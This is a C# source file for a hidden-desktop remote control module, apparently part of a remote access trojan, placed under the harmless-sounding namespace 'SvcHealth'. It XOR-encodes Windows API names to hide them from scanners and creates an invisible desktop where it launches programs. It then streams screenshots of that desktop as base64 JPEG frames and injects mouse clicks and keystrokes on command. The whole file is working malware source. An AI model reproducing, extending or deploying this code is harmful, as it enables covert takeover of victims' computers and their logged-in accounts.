using System;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcHealth
{
    static class HiddenDesktop
    {
        static IntPtr desk;
        static string deskName;
        static IntPtr origDesk;
        static uint lastFrameHash;
        static long lastFrameTick;

        static string S(byte[] d) { var c = new char[d.Length]; for (int i = 0; i < d.Length; i++) c[i] = (char)(d[i] ^ 0x37); return new string(c); }

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetModuleHandleA(string name);
        [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
        static extern IntPtr GetProcAddress(IntPtr hMod, string name);

        static Delegate Resolve(byte[] mod, byte[] fn, Type t)
        {
            IntPtr h = GetModuleHandleA(S(mod));
            if (h == IntPtr.Zero) return null;
            IntPtr a = GetProcAddress(h, S(fn));
            if (a == IntPtr.Zero) return null;
            return Marshal.GetDelegateForFunctionPointer(a, t);
        }

        static byte[] _u32 = { 0x42, 0x44, 0x52, 0x45, 0x04, 0x05, 0x19, 0x53, 0x5B, 0x5B };
        static byte[] _k32 = { 0x5C, 0x52, 0x45, 0x59, 0x52, 0x5B, 0x04, 0x05, 0x19, 0x53, 0x5B, 0x5B };
        static byte[] _nCDW = { 0x74, 0x45, 0x52, 0x56, 0x43, 0x52, 0x73, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47, 0x60 };
        static byte[] _nODW = { 0x78, 0x47, 0x52, 0x59, 0x73, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47, 0x60 };
        static byte[] _nSTD = { 0x64, 0x52, 0x43, 0x63, 0x5F, 0x45, 0x52, 0x56, 0x53, 0x73, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47 };
        static byte[] _nCD = { 0x74, 0x5B, 0x58, 0x44, 0x52, 0x73, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47 };
        static byte[] _nSD = { 0x64, 0x40, 0x5E, 0x43, 0x54, 0x5F, 0x73, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47 };
        static byte[] _nOID = { 0x78, 0x47, 0x52, 0x59, 0x7E, 0x59, 0x47, 0x42, 0x43, 0x73, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47 };
        static byte[] _nPW = { 0x67, 0x45, 0x5E, 0x59, 0x43, 0x60, 0x5E, 0x59, 0x53, 0x58, 0x40 };
        static byte[] _nSI = { 0x64, 0x52, 0x59, 0x53, 0x7E, 0x59, 0x47, 0x42, 0x43 };
        static byte[] _nCPW = { 0x74, 0x45, 0x52, 0x56, 0x43, 0x52, 0x67, 0x45, 0x58, 0x54, 0x52, 0x44, 0x44, 0x60 };
        static byte[] _nSW = { 0x64, 0x5F, 0x58, 0x40, 0x60, 0x5E, 0x59, 0x53, 0x58, 0x40 };

        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate IntPtr DA(string n, string d, IntPtr dm, int f, int acc, IntPtr sa);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate IntPtr DB(string n, int f, bool inherit, int acc);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool DC(IntPtr h);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool DD(IntPtr h);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool DE(IntPtr h);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate IntPtr DF(int flags, bool inherit, int access);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool DG(IntPtr h, IntPtr hdc, uint flags);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint DH(uint n, IntPtr p, int sz);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate bool DI(IntPtr h, int cmd);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        delegate bool DJ(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, int flags, IntPtr env, string dir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);

        static DA pCDW;
        static DB pODW;
        static DC pSTD;
        static DD pCD;
        static DE pSD;
        static DF pOID;
        static DG pPW;
        static DH pSI;
        static DI pSW;
        static DJ pCPW;

        static void EnsureApi()
        {
            if (pCDW != null) return;
            pCDW = (DA)Resolve(_u32, _nCDW, typeof(DA));
            pODW = (DB)Resolve(_u32, _nODW, typeof(DB));
            pSTD = (DC)Resolve(_u32, _nSTD, typeof(DC));
            pCD = (DD)Resolve(_u32, _nCD, typeof(DD));
            pSD = (DE)Resolve(_u32, _nSD, typeof(DE));
            pOID = (DF)Resolve(_u32, _nOID, typeof(DF));
            pPW = (DG)Resolve(_u32, _nPW, typeof(DG));
            pSI = (DH)Resolve(_u32, _nSI, typeof(DH));
            pSW = (DI)Resolve(_u32, _nSW, typeof(DI));
            pCPW = (DJ)Resolve(_k32, _nCPW, typeof(DJ));
        }

        static uint CallSendKB(uint n, KBINPUT[] inp)
        {
            int sz = 40;
            IntPtr buf = Marshal.AllocHGlobal((int)n * sz);
            try
            {
                for (int i = 0; i < (int)n; i++)
                    Marshal.StructureToPtr(inp[i], new IntPtr(buf.ToInt64() + i * sz), false);
                return pSI(n, buf, sz);
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        static uint CallSendMouse(uint n, MINPUT[] inp)
        {
            int sz = 40;
            IntPtr buf = Marshal.AllocHGlobal((int)n * sz);
            try
            {
                for (int i = 0; i < (int)n; i++)
                    Marshal.StructureToPtr(inp[i], new IntPtr(buf.ToInt64() + i * sz), false);
                return pSI(n, buf, sz);
            }
            finally { Marshal.FreeHGlobal(buf); }
        }

        [DllImport("user32.dll")] static extern IntPtr GetThreadDesktop(int tid);
        [DllImport("kernel32.dll")] static extern int GetCurrentThreadId();

        public static string Handle(string command)
        {
            try
            {
                if (Environment.OSVersion.Platform != PlatformID.Win32NT) return S(new byte[] { 0x5F, 0x5E, 0x53, 0x53, 0x52, 0x59, 0x17, 0x53, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47, 0x17, 0x45, 0x52, 0x46, 0x42, 0x5E, 0x45, 0x52, 0x44, 0x17, 0x40, 0x5E, 0x59, 0x53, 0x58, 0x40, 0x44 });
                EnsureApi();
                int sid = 0;
                ProcessIdToSessionId(GetCurrentProcessId(), out sid);
                if (sid == 0 && Environment.GetEnvironmentVariable("SP_HD_HOST") != "1")
                    return S(new byte[] { 0x53, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47, 0x17, 0x5F, 0x58, 0x44, 0x43, 0x17, 0x45, 0x52, 0x46, 0x42, 0x5E, 0x45, 0x52, 0x53, 0x17, 0x44, 0x52, 0x44, 0x44, 0x5E, 0x58, 0x59, 0x0A, 0x07 });
                var rest = command.Length > 5 ? command.Substring(5).Trim() : "";
                var sp = rest.IndexOf(' ');
                var action = sp < 0 ? rest : rest.Substring(0, sp);
                var arg = sp < 0 ? "" : rest.Substring(sp + 1).Trim();
                switch (action)
                {
                    case "":
                    case "start": return OnDesk(() => Start(string.IsNullOrEmpty(arg) ? @"C:\Windows\explorer.exe" : arg));
                    case "frame": return OnDesk(Frame);
                    case "frame!": lastFrameHash = 0; lastFrameTick = 0; return OnDesk(Frame);
                    case "click": return OnDesk(() => Click(arg, false, false));
                    case "dblclick": return OnDesk(() => Click(arg, false, true));
                    case "rclick": return OnDesk(() => Click(arg, true, false));
                    case "type": return OnDesk(() => Type(arg));
                    case "key": return OnDesk(() => Key(string.IsNullOrEmpty(arg) ? 13 : int.Parse(arg)));
                    case "stop": return Stop();
                    default: return S(new byte[] { 0x42, 0x59, 0x5C, 0x59, 0x58, 0x40, 0x59, 0x17, 0x56, 0x54, 0x43, 0x5E, 0x58, 0x59 });
                }
            }
            catch (Exception ex) { return S(new byte[] { 0x5F, 0x53, 0x17, 0x52, 0x45, 0x45, 0x0D, 0x17 }) + ex.GetType().Name; }
        }

        static string OnDesk(Func<string> f)
        {
            if (!Ensure()) return S(new byte[] { 0x53, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47, 0x17, 0x58, 0x47, 0x52, 0x59, 0x17, 0x51, 0x56, 0x5E, 0x5B, 0x52, 0x53 });
            origDesk = GetThreadDesktop(GetCurrentThreadId());
            if (!pSTD(desk)) return S(new byte[] { 0x44, 0x52, 0x43, 0x17, 0x53, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47, 0x17, 0x51, 0x56, 0x5E, 0x5B, 0x52, 0x53 });
            try { return f(); }
            catch { return S(new byte[] { 0x53, 0x52, 0x44, 0x5C, 0x17, 0x52, 0x45, 0x45 }); }
            finally
            {
                if (origDesk != IntPtr.Zero)
                {
                    pSTD(origDesk);
                    origDesk = IntPtr.Zero;
                }
            }
        }

        static bool Ensure()
        {
            if (desk != IntPtr.Zero) return true;
            var rng = new Random();
            var chars = "abcdefghijklmnopqrstuvwxyz";
            var sb = new StringBuilder(10);
            for (int i = 0; i < 10; i++) sb.Append(chars[rng.Next(chars.Length)]);
            deskName = sb.ToString();
            desk = pCDW(deskName, null, IntPtr.Zero, 0, 0x000F01FF, IntPtr.Zero);
            if (desk == IntPtr.Zero) desk = pODW(deskName, 0, false, 0x000F01FF);
            return desk != IntPtr.Zero;
        }

        static string Start(string exe)
        {
            var si = new STARTUPINFO { cb = Marshal.SizeOf(typeof(STARTUPINFO)), lpDesktop = "WinSta0\\" + deskName, dwFlags = 1, wSW = 5 };
            PROCESS_INFORMATION pi;
            if (!pCPW(null, exe, IntPtr.Zero, IntPtr.Zero, false, 0x10, IntPtr.Zero, null, ref si, out pi))
                return "err " + Marshal.GetLastWin32Error();
            int newPid = pi.dwProcessId;
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            System.Threading.Thread.Sleep(3000);
            var top = TopWindow();
            if (top != IntPtr.Zero) pSW(top, 3);
            return "ok pid=" + newPid;
        }

        delegate bool EnumWinProc(IntPtr hwnd, IntPtr lp);
        [DllImport("user32.dll")] static extern bool EnumWindows(EnumWinProc cb, IntPtr lp);
        [DllImport("user32.dll")] static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumWinProc cb, IntPtr lp);
        [DllImport("user32.dll")] static extern bool IsWindowVisible(IntPtr h);
        [DllImport("user32.dll")] static extern bool GetWindowRect(IntPtr h, out RECT r);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int GetWindowTextW(IntPtr h, StringBuilder s, int n);
        [DllImport("user32.dll")] static extern int GetWindowLong(IntPtr h, int idx);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr d, int dx, int dy, int w, int h, IntPtr s, int sx, int sy, int rop);
        [DllImport("gdi32.dll")] static extern IntPtr CreateSolidBrush(int color);
        [DllImport("user32.dll")] static extern int FillRect(IntPtr hdc, ref RECT r, IntPtr brush);
        [DllImport("user32.dll")] static extern IntPtr GetWindowDC(IntPtr h);
        [StructLayout(LayoutKind.Sequential)]
        struct RECT { public int left, top, right, bottom; }

        static uint QuickHash(byte[] data, int len)
        {
            uint h = 0x811C9DC5;
            int step = len > 8192 ? len / 4096 : 1;
            for (int i = 0; i < len; i += step) { h ^= data[i]; h *= 0x01000193; }
            return h;
        }

        static string Frame()
        {
            long now = Environment.TickCount;
            if (now - lastFrameTick < 300) return "HDIMG:same";
            int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
            if (sw <= 0 || sh <= 0) { sw = 1280; sh = 800; }

            var screenDC = GetDC(IntPtr.Zero);
            var fullDC = CreateCompatibleDC(screenDC);
            var fullBmp = CreateCompatibleBitmap(screenDC, sw, sh);
            var fullOld = SelectObject(fullDC, fullBmp);

            var bgRect = new RECT { left = 0, top = 0, right = sw, bottom = sh };
            var bgBrush = CreateSolidBrush(0x00362D20);
            FillRect(fullDC, ref bgRect, bgBrush);
            DeleteObject(bgBrush);

            var wins = new System.Collections.Generic.List<IntPtr>();
            var allWins = new System.Collections.Generic.List<IntPtr>();

            EnumDesktopWindows(desk, delegate(IntPtr hwnd, IntPtr lp)
            {
                allWins.Add(hwnd);
                if (IsWindowVisible(hwnd))
                {
                    RECT rc;
                    if (GetWindowRect(hwnd, out rc))
                    {
                        int ww = rc.right - rc.left;
                        int wh = rc.bottom - rc.top;
                        if (ww > 1 && wh > 1) wins.Add(hwnd);
                    }
                }
                return true;
            }, IntPtr.Zero);

            if (wins.Count == 0 && allWins.Count > 0)
            {
                foreach (var hwnd in allWins)
                {
                    RECT rc;
                    if (GetWindowRect(hwnd, out rc))
                    {
                        int ww = rc.right - rc.left;
                        int wh = rc.bottom - rc.top;
                        if (ww > 1 && wh > 1)
                        {
                            pSW(hwnd, 5);
                            wins.Add(hwnd);
                        }
                    }
                }
            }

            if (wins.Count == 0)
            {
                EnumWindows(delegate(IntPtr hwnd, IntPtr lp)
                {
                    if (IsWindowVisible(hwnd))
                    {
                        RECT rc;
                        if (GetWindowRect(hwnd, out rc))
                        {
                            int ww = rc.right - rc.left;
                            int wh = rc.bottom - rc.top;
                            if (ww > 1 && wh > 1) wins.Add(hwnd);
                        }
                    }
                    return true;
                }, IntPtr.Zero);
            }

            int painted = 0;
            for (int i = wins.Count - 1; i >= 0; i--)
            {
                RECT rc;
                if (!GetWindowRect(wins[i], out rc)) continue;
                int ww = rc.right - rc.left;
                int wh = rc.bottom - rc.top;
                if (ww <= 0 || wh <= 0) continue;

                var wDC = CreateCompatibleDC(screenDC);
                var wBmp = CreateCompatibleBitmap(screenDC, ww, wh);
                var wOld = SelectObject(wDC, wBmp);

                bool pwOk = false;
                IntPtr captureHwnd = wins[i];
                IntPtr captureDC = wDC;
                IntPtr deskCopy = desk;
                var pwThread = new System.Threading.Thread(() => {
                    pSTD(deskCopy);
                    pwOk = pPW(captureHwnd, captureDC, 2);
                });
                pwThread.IsBackground = true;
                pwThread.Start();
                if (!pwThread.Join(2000))
                {
                    try { pwThread.Abort(); } catch {}
                    SelectObject(wDC, wOld);
                    DeleteObject(wBmp);
                    DeleteDC(wDC);
                    continue;
                }

                if (!pwOk)
                {
                    var srcDC = GetWindowDC(wins[i]);
                    BitBlt(wDC, 0, 0, ww, wh, srcDC, 0, 0, 0x00CC0020);
                    ReleaseDC(wins[i], srcDC);
                }

                BitBlt(fullDC, rc.left, rc.top, ww, wh, wDC, 0, 0, 0x00CC0020);
                SelectObject(wDC, wOld);
                DeleteObject(wBmp);
                DeleteDC(wDC);
                painted++;
            }

            int stride = ((sw * 3 + 3) / 4) * 4;
            var pixels = new byte[stride * sh];
            var bi = new BITMAPINFO { biSize = 40, biWidth = sw, biHeight = sh, biPlanes = 1, biBitCount = 24 };
            GetDIBits(fullDC, fullBmp, 0, sh, pixels, ref bi, 0);
            SelectObject(fullDC, fullOld);
            DeleteObject(fullBmp);
            DeleteDC(fullDC);
            ReleaseDC(IntPtr.Zero, screenDC);

            uint h = QuickHash(pixels, pixels.Length);
            if (h == lastFrameHash && lastFrameHash != 0)
            {
                Array.Clear(pixels, 0, pixels.Length);
                return "HDIMG:same";
            }
            lastFrameHash = h;
            lastFrameTick = Environment.TickCount;

            int dw = sw, dh = sh;

            byte[] frameBytes;
            try
            {
                using (var bmp = new System.Drawing.Bitmap(dw, dh, System.Drawing.Imaging.PixelFormat.Format24bppRgb))
                {
                    var bd = bmp.LockBits(new System.Drawing.Rectangle(0, 0, dw, dh),
                        System.Drawing.Imaging.ImageLockMode.WriteOnly,
                        System.Drawing.Imaging.PixelFormat.Format24bppRgb);
                    int dstStride = bd.Stride;
                    for (int row = 0; row < dh; row++)
                    {
                        int srcOff = (dh - 1 - row) * stride;
                        IntPtr dst = new IntPtr(bd.Scan0.ToInt64() + row * dstStride);
                        Marshal.Copy(pixels, srcOff, dst, Math.Min(stride, dstStride));
                    }
                    bmp.UnlockBits(bd);
                    using (var ms = new System.IO.MemoryStream())
                    {
                        var codec = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders();
                        System.Drawing.Imaging.ImageCodecInfo jpegCodec = null;
                        for (int ci = 0; ci < codec.Length; ci++) { if (codec[ci].MimeType == "image/jpeg") { jpegCodec = codec[ci]; break; } }
                        if (jpegCodec != null)
                        {
                            var ep = new System.Drawing.Imaging.EncoderParameters(1);
                            ep.Param[0] = new System.Drawing.Imaging.EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 40L);
                            bmp.Save(ms, jpegCodec, ep);
                        }
                        else bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                        frameBytes = ms.ToArray();
                    }
                }
            }
            catch
            {
                var file = new byte[54 + pixels.Length];
                file[0] = (byte)'B'; file[1] = (byte)'M';
                BitConverter.GetBytes(file.Length).CopyTo(file, 2);
                BitConverter.GetBytes(54).CopyTo(file, 10);
                BitConverter.GetBytes(40).CopyTo(file, 14);
                BitConverter.GetBytes(dw).CopyTo(file, 18);
                BitConverter.GetBytes(dh).CopyTo(file, 22);
                file[26] = 1; file[28] = 24;
                Buffer.BlockCopy(pixels, 0, file, 54, pixels.Length);
                frameBytes = file;
            }

            Array.Clear(pixels, 0, pixels.Length);
            var result = "HDIMG:" + sw + "," + sh + ":" + Convert.ToBase64String(frameBytes);
            Array.Clear(frameBytes, 0, frameBytes.Length);
            return result;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINT { public int x, y; }
        [DllImport("user32.dll")] static extern bool SetCursorPos(int x, int y);
        [DllImport("user32.dll")] static extern IntPtr WindowFromPoint(POINT p);
        [DllImport("user32.dll")] static extern IntPtr ChildWindowFromPoint(IntPtr parent, POINT p);
        [DllImport("user32.dll")] static extern bool ScreenToClient(IntPtr h, ref POINT p);
        [DllImport("user32.dll")] static extern bool SetForegroundWindow(IntPtr h);

        static IntPtr lastClickWnd;

        static IntPtr TopWindow()
        {
            IntPtr best = IntPtr.Zero;
            IntPtr fallback = IntPtr.Zero;
            EnumDesktopWindows(desk, delegate(IntPtr wnd, IntPtr lp)
            {
                if (!IsWindowVisible(wnd)) return true;
                int style = GetWindowLong(wnd, -16);
                if ((style & 0x40000000) != 0) return true;
                RECT rc;
                if (!GetWindowRect(wnd, out rc)) return true;
                int ww = rc.right - rc.left, wh = rc.bottom - rc.top;
                if (ww < 50 || wh < 30) return true;
                var sb = new StringBuilder(64);
                GetWindowTextW(wnd, sb, 64);
                var title = sb.ToString();
                if (title.Length == 0) return true;
                if (fallback == IntPtr.Zero) fallback = wnd;
                if (title == "Program Manager") return true;
                var cls = new StringBuilder(128);
                GetClassNameW(wnd, cls, 128);
                var cn = cls.ToString();
                if (cn == "BgInfoWindowClass" || cn == "Progman" || cn == "WorkerW") return true;
                best = wnd;
                return false;
            }, IntPtr.Zero);
            return best != IntPtr.Zero ? best : fallback;
        }

        [DllImport("user32.dll")] static extern IntPtr RealChildWindowFromPoint(IntPtr parent, POINT p);
        [DllImport("user32.dll", CharSet = CharSet.Unicode)] static extern int GetClassNameW(IntPtr hwnd, StringBuilder buf, int max);

        static IntPtr lastTopWnd;

        static IntPtr FindAtPoint(int x, int y)
        {
            IntPtr top = IntPtr.Zero;
            EnumDesktopWindows(desk, delegate(IntPtr wnd, IntPtr lp)
            {
                if (!IsWindowVisible(wnd)) return true;
                RECT rc;
                if (!GetWindowRect(wnd, out rc)) return true;
                if (x >= rc.left && x < rc.right && y >= rc.top && y < rc.bottom)
                {
                    int style = GetWindowLong(wnd, -16);
                    if ((style & 0x40000000) == 0) { top = wnd; return false; }
                }
                return true;
            }, IntPtr.Zero);
            if (top == IntPtr.Zero)
            {
                var pt = new POINT { x = x, y = y };
                top = WindowFromPoint(pt);
            }
            if (top == IntPtr.Zero) return IntPtr.Zero;
            lastTopWnd = top;
            var current = top;
            for (int depth = 0; depth < 8; depth++)
            {
                var cp = new POINT { x = x, y = y };
                ScreenToClient(current, ref cp);
                var child = RealChildWindowFromPoint(current, cp);
                if (child == IntPtr.Zero || child == current) break;
                current = child;
            }
            return current;
        }

        static void Attach(IntPtr hwnd, out bool attached)
        {
            attached = false;
            int myTid = GetCurrentThreadId();
            int dummy;
            int tid = GetWindowThreadProcessId(hwnd, out dummy);
            if (tid != 0 && tid != myTid) attached = AttachThreadInput(myTid, tid, true);
        }

        static string Click(string arg, bool right, bool dbl)
        {
            var p = arg.Split(new char[]{' ', ','}, StringSplitOptions.RemoveEmptyEntries);
            if (p.Length < 2) return S(new byte[] { 0x54, 0x5B, 0x5E, 0x54, 0x5C, 0x17, 0x59, 0x52, 0x52, 0x53, 0x44, 0x17, 0x4F, 0x17, 0x4E });
            int x = int.Parse(p[0]), y = int.Parse(p[1]);

            var hwnd = FindAtPoint(x, y);
            var topWnd = lastTopWnd != IntPtr.Zero ? lastTopWnd : hwnd;
            if (topWnd == IntPtr.Zero && hwnd == IntPtr.Zero) return S(new byte[] { 0x59, 0x58, 0x17, 0x40, 0x5E, 0x59, 0x53, 0x58, 0x40, 0x17, 0x56, 0x43, 0x17 }) + x + "," + y;

            IntPtr prevDesk = pOID(0, false, 0x000F01FF);
            pSD(desk);

            bool attached = false;
            if (topWnd != IntPtr.Zero)
            {
                Attach(topWnd, out attached);
                SetForegroundWindow(topWnd);
            }

            SetCursorPos(x, y);
            System.Threading.Thread.Sleep(50);

            uint downFlag = right ? 0x0008u : 0x0002u;
            uint upFlag = right ? 0x0010u : 0x0004u;
            CallSendMouse(1, new MINPUT[] { new MINPUT { type = 0, dwFlags = downFlag } });
            System.Threading.Thread.Sleep(80);
            CallSendMouse(1, new MINPUT[] { new MINPUT { type = 0, dwFlags = upFlag } });

            if (dbl)
            {
                System.Threading.Thread.Sleep(80);
                CallSendMouse(1, new MINPUT[] { new MINPUT { type = 0, dwFlags = downFlag } });
                System.Threading.Thread.Sleep(60);
                CallSendMouse(1, new MINPUT[] { new MINPUT { type = 0, dwFlags = upFlag } });
            }

            System.Threading.Thread.Sleep(30);
            if (prevDesk != IntPtr.Zero)
            {
                pSD(prevDesk);
                pCD(prevDesk);
            }

            if (attached && topWnd != IntPtr.Zero)
            {
                int myTid = GetCurrentThreadId();
                int dummy;
                int tid = GetWindowThreadProcessId(topWnd, out dummy);
                AttachThreadInput(myTid, tid, false);
            }
            lastClickWnd = hwnd != IntPtr.Zero ? hwnd : topWnd;
            var label = dbl ? "dblclick " : (right ? "rclick " : "click ");
            return label + x + " " + y;
        }

        [StructLayout(LayoutKind.Explicit, Size = 40)]
        struct KBINPUT
        {
            [FieldOffset(0)] public uint type;
            [FieldOffset(8)] public ushort wVk;
            [FieldOffset(10)] public ushort wScan;
            [FieldOffset(12)] public uint dwFlags;
            [FieldOffset(16)] public uint time;
            [FieldOffset(24)] public IntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Explicit, Size = 40)]
        struct MINPUT
        {
            [FieldOffset(0)] public uint type;
            [FieldOffset(8)] public int dx;
            [FieldOffset(12)] public int dy;
            [FieldOffset(16)] public uint mouseData;
            [FieldOffset(20)] public uint dwFlags;
            [FieldOffset(24)] public uint time;
            [FieldOffset(32)] public IntPtr dwExtraInfo;
        }

        static string Type(string text)
        {
            if (string.IsNullOrEmpty(text)) return S(new byte[] { 0x43, 0x4E, 0x47, 0x52, 0x17, 0x59, 0x52, 0x52, 0x53, 0x44, 0x17, 0x43, 0x52, 0x4F, 0x43 });
            var top = lastTopWnd != IntPtr.Zero ? lastTopWnd : (lastClickWnd != IntPtr.Zero ? lastClickWnd : TopWindow());
            if (top == IntPtr.Zero) return S(new byte[] { 0x43, 0x4E, 0x47, 0x52, 0x0D, 0x17, 0x59, 0x58, 0x17, 0x43, 0x56, 0x45, 0x50, 0x52, 0x43, 0x17, 0x40, 0x5E, 0x59, 0x53, 0x58, 0x40 });

            IntPtr prevDesk = pOID(0, false, 0x000F01FF);
            pSD(desk);

            bool attached;
            Attach(top, out attached);
            SetForegroundWindow(top);
            System.Threading.Thread.Sleep(50);

            foreach (var ch in text)
            {
                ushort scan = (ushort)ch;
                ushort vk = 0;
                uint flags = 4;
                if (ch == '\n' || ch == '\r') { vk = 13; scan = 0; flags = 0; }
                var down = new KBINPUT { type = 1, wVk = vk, wScan = scan, dwFlags = flags };
                var up = new KBINPUT { type = 1, wVk = vk, wScan = scan, dwFlags = flags | 2 };
                CallSendKB(2, new KBINPUT[] { down, up });
            }

            System.Threading.Thread.Sleep(30);
            if (prevDesk != IntPtr.Zero) { pSD(prevDesk); pCD(prevDesk); }
            if (attached) { int myTid = GetCurrentThreadId(); int dummy; int tid = GetWindowThreadProcessId(top, out dummy); AttachThreadInput(myTid, tid, false); }
            return "typed " + text.Length;
        }

        static string Key(int vk)
        {
            var fg = lastClickWnd != IntPtr.Zero ? lastClickWnd : TopWindow();
            if (fg == IntPtr.Zero) return S(new byte[] { 0x5C, 0x52, 0x4E, 0x0D, 0x17, 0x59, 0x58, 0x17, 0x43, 0x56, 0x45, 0x50, 0x52, 0x43, 0x17, 0x40, 0x5E, 0x59, 0x53, 0x58, 0x40 });

            IntPtr prevDesk = pOID(0, false, 0x000F01FF);
            pSD(desk);

            bool attached;
            Attach(fg, out attached);
            SetForegroundWindow(fg);

            var down = new KBINPUT { type = 1, wVk = (ushort)vk, dwFlags = 0 };
            var up = new KBINPUT { type = 1, wVk = (ushort)vk, dwFlags = 2 };
            CallSendKB(1, new KBINPUT[] { down });
            System.Threading.Thread.Sleep(30);
            CallSendKB(1, new KBINPUT[] { up });

            System.Threading.Thread.Sleep(30);
            if (prevDesk != IntPtr.Zero) { pSD(prevDesk); pCD(prevDesk); }
            if (attached) { int myTid = GetCurrentThreadId(); int dummy; int tid = GetWindowThreadProcessId(fg, out dummy); AttachThreadInput(myTid, tid, false); }
            return "key " + vk;
        }

        static string Stop()
        {
            if (origDesk != IntPtr.Zero)
            {
                pSTD(origDesk);
                origDesk = IntPtr.Zero;
            }
            if (desk != IntPtr.Zero) { pCD(desk); desk = IntPtr.Zero; }
            lastClickWnd = IntPtr.Zero;
            return S(new byte[] { 0x53, 0x52, 0x44, 0x5C, 0x43, 0x58, 0x47, 0x17, 0x44, 0x43, 0x58, 0x47, 0x47, 0x52, 0x53 });
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb; public string lpReserved; public string lpDesktop; public string lpTitle;
            public int dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
            public short wSW, cbReserved2; public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION { public IntPtr hProcess, hThread; public int dwProcessId, dwThreadId; }
        [StructLayout(LayoutKind.Sequential)]
        struct BITMAPINFO
        {
            public int biSize, biWidth, biHeight;
            public short biPlanes, biBitCount;
            public int biCompression, biSizeImage, biXPelsPerMeter, biYPelsPerMeter, biClrUsed, biClrImportant;
        }

        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);
        [DllImport("user32.dll")] static extern int ReleaseDC(IntPtr h, IntPtr hdc);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int i);
        [DllImport("user32.dll")] static extern bool AttachThreadInput(int idAttach, int idTarget, bool fAttach);
        [DllImport("user32.dll")] static extern int GetWindowThreadProcessId(IntPtr hWnd, out int pid);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32.dll")] static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int w, int h);
        [DllImport("gdi32.dll")] static extern IntPtr SelectObject(IntPtr hdc, IntPtr o);
        [DllImport("gdi32.dll")] static extern int GetDIBits(IntPtr hdc, IntPtr bmp, int start, int lines, byte[] bits, ref BITMAPINFO bi, int usage);
        [DllImport("gdi32.dll")] static extern bool DeleteObject(IntPtr o);
        [DllImport("gdi32.dll")] static extern bool DeleteDC(IntPtr hdc);
        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll")] static extern int GetCurrentProcessId();
        [DllImport("kernel32.dll")] static extern bool ProcessIdToSessionId(int pid, out int sid);
    }
}
